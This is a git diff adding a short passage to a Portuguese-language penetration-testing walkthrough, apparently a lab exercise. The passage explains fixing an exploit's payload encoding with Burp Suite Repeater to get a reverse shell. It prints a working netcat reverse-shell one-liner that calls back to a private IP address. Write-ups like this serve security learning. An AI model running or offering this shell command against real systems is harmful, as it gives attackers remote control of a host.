@@ -112,3 +112,13 @@ Após a fase de enumeração e análise das vulnerabilidades encontradas, passei
 Tentei várias formas de obter uma reverse shell utilizando o próprio exploit, mas não obtive sucesso imediato. Diante disso, precisei usar o Burp Suite para interceptar o payload do exploit e entender melhor o que estava acontecendo.
 
 ![image](https://github.com/user-attachments/assets/008f68a1-28cb-4513-b637-f20b0a5cb034)
+
+O problema era que, ao enviar o payload:
+
+```
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 192.168.45.219 80 >/tmp/f
+```
+
+ele não estava sendo codificado corretamente. Foi necessário enviar a requisição para o **Repeater** no **Burp Suite** e codificar o payload corretamente. Após isso, consegui obter uma **reverse shell**.
+
+
